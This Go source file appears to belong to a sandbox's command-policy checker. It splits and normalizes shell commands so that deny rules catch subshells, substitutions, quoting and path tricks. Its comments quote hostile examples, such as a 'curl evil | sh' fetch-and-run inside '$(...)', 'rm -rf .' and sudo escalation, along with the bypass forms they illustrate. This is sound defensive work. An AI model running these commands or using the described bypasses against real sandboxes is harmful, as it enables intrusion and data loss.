package sandbox

import (
	"path/filepath"
	"strings"
)

// stripExeSuffixFromLeadingWord strips a Windows-style `.exe` suffix and the
// leading directory from the first word of cmd. This mirrors extractBaseCommand's
// normalization so that a single policy rule like `deny:exec:sudo *` matches
// all of: `sudo whoami`, `/usr/bin/sudo whoami`, `./sudo whoami`,
// `sudo.exe whoami`. The rest of the command is returned verbatim.
func stripExeSuffixFromLeadingWord(cmd string) string {
	leadingSpaces := 0
	for leadingSpaces < len(cmd) && (cmd[leadingSpaces] == ' ' || cmd[leadingSpaces] == '\t') {
		leadingSpaces++
	}
	rest := cmd[leadingSpaces:]
	inQuote := false
	quoteChar := byte(0)
	end := len(rest)
	for i := 0; i < len(rest); i++ {
		c := rest[i]
		if !inQuote && (c == '"' || c == '\'') {
			inQuote = true
			quoteChar = c
		} else if inQuote && c == quoteChar {
			inQuote = false
		} else if !inQuote && (c == ' ' || c == '\t') {
			end = i
			break
		}
	}
	leading := rest[:end]
	// Strip leading directory so /usr/bin/sudo → sudo
	if strings.ContainsAny(leading, "/\\") {
		leading = filepath.Base(strings.ReplaceAll(leading, `\`, "/"))
	}
	// Strip .exe suffix (case-insensitive, e.g. GO.EXE)
	if len(leading) > 4 && strings.EqualFold(leading[len(leading)-4:], ".exe") {
		leading = leading[:len(leading)-4]
	}
	return cmd[:leadingSpaces] + leading + rest[end:]
}

// extractBaseCommand extracts the base command (first word) from a shell command.
//
// On Windows the actual binary carries an `.exe` suffix (`go.exe`, `node.exe`),
// but the policy allow-list rules are written suffix-free (`go`, `node`). To
// keep a single rule covering both invocation styles, a trailing `.exe` (case-
// insensitive) is stripped from the returned base. Filesystem case-sensitivity
// makes this the right call: NTFS treats `Go.exe`, `GO.EXE`, and `go.exe` as
// the same file, so the policy comparison must too.
//
// V-03: the leading directory is also stripped so `/usr/bin/sudo whoami`,
// `./sudo whoami`, and `\sudo whoami` (Windows) all reduce to base `sudo`.
// Without that, an operator's `deny:exec:sudo *` rule silently failed to
// match the absolute-path invocation. Tab and newline join space as
// recognized first-arg separators so `sudo\twhoami` and `sudo\nwhoami` —
// both of which bash IFS-splits as two tokens — also reduce to `sudo`.
func extractBaseCommand(cmd string) string {
	// Remove leading/trailing whitespace
	cmd = strings.TrimSpace(cmd)

	// Handle quoted strings - find first unquoted whitespace token. Bash IFS
	// splits on space/tab/newline so the matcher must too.
	inQuote := false
	quoteChar := byte(0)
	base := cmd
	for i := 0; i < len(cmd); i++ {
		if !inQuote && (cmd[i] == '"' || cmd[i] == '\'') {
			inQuote = true
			quoteChar = cmd[i]
		} else if inQuote && cmd[i] == quoteChar {
			inQuote = false
		} else if !inQuote && (cmd[i] == ' ' || cmd[i] == '\t' || cmd[i] == '\n') {
			base = cmd[:i]
			break
		}
	}
	// V-05: strip a matching outer quote pair so a part like
	// `"sudo whoami"` (produced by here-string `bash <<<"sudo whoami"`
	// or generally any quoted opaque token) gets evaluated as
	// `sudo whoami` against the deny-list. Without this, the policy
	// matched the literal `"sudo`, never triggering the `sudo *`
	// deny rule and silently allowing the command. Operator-defined
	// allow rules for programs whose path contains spaces (rare) need
	// to register the unquoted form.
	if len(base) >= 2 {
		first, last := base[0], base[len(base)-1]
		if (first == '"' || first == '\'') && first == last {
			base = base[1 : len(base)-1]
		}
	}
	// Strip leading parentheses (subshell syntax like `(sudo whoami)` or `((sudo whoami)`)
	// so the inner command is evaluated correctly.
	for len(base) > 0 && base[0] == '(' {
		base = base[1:]
	}
	// V-03: strip the leading directory so `/usr/bin/sudo`, `./sudo`, and
	// `\sudo` all collapse to base `sudo`. filepath.Base handles both
	// separator styles on its host OS; we additionally normalize backslash
	// to forward-slash up-front so a Linux daemon receiving a Windows-shaped
	// `\sudo` argv (e.g. through WSL) still gets the leading dir stripped.
	if strings.ContainsAny(base, "/\\") {
		base = filepath.Base(strings.ReplaceAll(base, `\`, "/"))
	}
	if len(base) > 4 && strings.EqualFold(base[len(base)-4:], ".exe") {
		base = base[:len(base)-4]
	}
	return base
}

// shellOperators returns true if cmd contains shell operators that chain commands.
func hasShellChainOperators(cmd string) bool {
	// Check for common shell operators that chain commands. Bare `&` (POSIX
	// background) is included alongside `&&`: a missing entry here previously
	// let `git --version & sudo whoami` skip the chain-aware split path so the
	// trailing `sudo …` rode past the start-anchored deny rules. See V-1 in
	// security-report/.
	operators := []string{"&&", "||", "&", ";", "|", ">", ">>", "<", "<<", "\n"}
	for _, op := range operators {
		if strings.Contains(cmd, op) {
			return true
		}
	}

	// Check for command substitution patterns
	// Backticks: `command`
	if strings.Contains(cmd, "`") {
		return true
	}
	// $(command) substitution
	if strings.Contains(cmd, "$(") {
		return true
	}
	// Here-documents: <<EOF ... EOF (simplified check for <<)
	if strings.Contains(cmd, "<<") {
		return true
	}
	// V-06: bare (subshell) — e.g. `(sudo whoami)` or `git status; (rm -rf .)`
	// must take the chain-aware split path so the splitter can recurse the
	// subshell body.
	if strings.Contains(cmd, "(") {
		return true
	}

	return false
}

// isRedirectionOperand checks if a token is a shell redirection operand (not a command).
// Examples: "2>&1", "&1", "1>", ">>file", "&2"
func isRedirectionOperand(token string) bool {
	token = strings.TrimSpace(token)
	if token == "" {
		return false
	}
	// Starts with a number followed by > or >>
	if len(token) >= 2 && token[0] >= '0' && token[0] <= '9' {
		if token[1] == '>' || token[1] == '<' {
			return true
		}
	}
	// Just & followed by number (like &1, &2)
	if len(token) >= 2 && token[0] == '&' {
		if token[1] >= '0' && token[1] <= '9' {
			return true
		}
	}
	return false
}

// isEnvAssignment checks if a token is an environment variable assignment (not a command).
// Examples: "GOCACHE=xxx", "HOME=/tmp"
func isEnvAssignment(token string) bool {
	token = strings.TrimSpace(token)
	if token == "" {
		return false
	}
	// Must contain = and not start with a digit
	eqIdx := strings.Index(token, "=")
	if eqIdx <= 0 {
		return false
	}
	// Check that the part before = looks like a valid env var name
	// (starts with letter or underscore, alphanumeric+underscore)
	name := token[:eqIdx]
	if name == "" {
		return false
	}
	first := name[0]
	if (first >= 'a' && first <= 'z') || (first >= 'A' && first <= 'Z') || first == '_' {
		return true
	}
	return false
}

// splitByShellOperators splits a command string by shell operators.
// Command substitutions `$(...)` and backtick `...` are also split so their
// inner commands are subject to policy evaluation as independent parts.
func splitByShellOperators(cmd string) []string {
	var parts []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	flush := func() {
		if current.Len() > 0 {
			parts = append(parts, current.String())
			current.Reset()
		}
	}

	for i := 0; i < len(cmd); i++ {
		c := cmd[i]

		if !inQuote && (c == '"' || c == '\'') {
			inQuote = true
			quoteChar = c
			current.WriteByte(c)
		} else if inQuote && c == quoteChar {
			inQuote = false
			current.WriteByte(c)
		} else if !inQuote {
			// $(...) command substitution: extract the inner part as its own segment,
			// then recursively split it so operators within the substitution are also
			// subject to policy checks. Without this, `curl * | sh` inside $(...) would
			// be matched as a single part against `curl *` and pass even though `| sh`
			// is not permitted.
			if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' {
				flush()
				depth := 1
				j := i + 2
				for j < len(cmd) && depth > 0 {
					switch cmd[j] {
					case '(':
						depth++
					case ')':
						depth--
					}
					if depth == 0 {
						break
					}
					j++
				}
				if j <= len(cmd) && j > i+2 {
					inner := cmd[i+2 : j]
					// Recursively split the substitution content so inner operators
					// (|, &&, ||, ;, etc.) are also checked by the policy.
					innerParts := splitByShellOperators(inner)
					parts = append(parts, innerParts...)
				}
				i = j
				continue
			}
			// Backtick command substitution.
			if c == '`' {
				flush()
				j := i + 1
				for j < len(cmd) && cmd[j] != '`' {
					j++
				}
				if j > i+1 {
					inner := cmd[i+1 : j]
					// Recursively split backtick content so inner operators are also checked.
					innerParts := splitByShellOperators(inner)
					parts = append(parts, innerParts...)
				}
				i = j
				continue
			}
			// V-06: bare (subshell). Mirror the $(...) handling minus the
			// `$` prefix so `(sudo whoami)` and `(cd /tmp; sudo whoami)`
			// don't slip past the per-part allow-list as a single opaque
			// `(sudo` base. Depth-tracked so nested parens parse correctly.
			if c == '(' {
				flush()
				depth := 1
				j := i + 1
				for j < len(cmd) && depth > 0 {
					switch cmd[j] {
					case '(':
						depth++
					case ')':
						depth--
					}
					if depth == 0 {
						break
					}
					j++
				}
				if j <= len(cmd) && j > i+1 {
					inner := cmd[i+1 : j]
					innerParts := splitByShellOperators(inner)
					parts = append(parts, innerParts...)
				}
				i = j
				continue
			}
			// Two-char operators.
			if i+1 < len(cmd) {
				next := cmd[i+1]
				if c == '&' && next == '&' {
					flush()
					i++
					continue
				}
				if c == '|' && next == '|' {
					flush()
					i++
					continue
				}
			}
			// Bare `&` (background) chains commands. Keep `&<digit>` attached so
			// `isRedirectionOperand` can still recognize fragments like `&1`,
			// `&2` produced by splitting at `>` (e.g. `cmd 2>&1` → ["cmd 2",
			// "&1"]). See V-1 in security-report/.
			if c == '&' {
				if i+1 < len(cmd) && cmd[i+1] >= '0' && cmd[i+1] <= '9' {
					current.WriteByte(c)
					continue
				}
				flush()
				continue
			}
			if c == ';' || c == '|' || c == '>' || c == '<' || c == '\n' {
				flush()
				continue
			}
			current.WriteByte(c)
		} else {
			// Inside a quote. Single quotes ('…') are opaque to bash — write through.
			// Double quotes ("…") still expand $(…) and `…` substitutions, so the inner
			// commands must be policy-checked the same way as in the unquoted branch
			// above. Without this, `git "$(curl evil | sh)"` would be a single opaque
			// part and slip past per-part allow-listing under a permitted base command.
			// Conservative behavior: a backslash-escaped `\$(` is also recursed into
			// (over-deny), since legitimate commands rarely embed literal `$(` inside
			// double quotes and false-positive denial is the safer failure mode.
			if quoteChar == '"' {
				if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' {
					flush()
					depth := 1
					j := i + 2
					for j < len(cmd) && depth > 0 {
						switch cmd[j] {
						case '(':
							depth++
						case ')':
							depth--
						}
						if depth == 0 {
							break
						}
						j++
					}
					if j <= len(cmd) && j > i+2 {
						inner := cmd[i+2 : j]
						innerParts := splitByShellOperators(inner)
						parts = append(parts, innerParts...)
					}
					i = j
					continue
				}
				if c == '`' {
					flush()
					j := i + 1
					for j < len(cmd) && cmd[j] != '`' {
						j++
					}
					if j > i+1 {
						inner := cmd[i+1 : j]
						innerParts := splitByShellOperators(inner)
						parts = append(parts, innerParts...)
					}
					i = j
					continue
				}
			}
			current.WriteByte(c)
		}
	}

	flush()
	return parts
}
